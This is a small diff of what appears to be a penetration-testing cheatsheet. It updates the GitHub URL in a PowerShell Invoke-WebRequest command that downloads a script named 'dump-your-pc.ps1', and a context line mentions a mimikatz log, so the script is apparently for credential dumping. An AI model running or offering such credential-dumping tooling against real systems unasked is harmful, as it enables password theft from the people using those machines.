@@ -57,7 +57,7 @@ dir mimikatz.log
 ## Additional Dumps
 
 ```powershell
-Invoke-WebRequest "https://raw.githubusercontent.com/PentestPlaybook/passwordless-credential-audit/main/dump-your-pc.ps1" -OutFile "dump-your-pc.ps1" -UseBasicParsing
+Invoke-WebRequest "https://raw.githubusercontent.com/PentestPlaybook/pentest-cheatsheets/main/hash-verification/dump-your-pc.ps1" -OutFile "dump-your-pc.ps1" -UseBasicParsing
 ```
 
 ```powershell
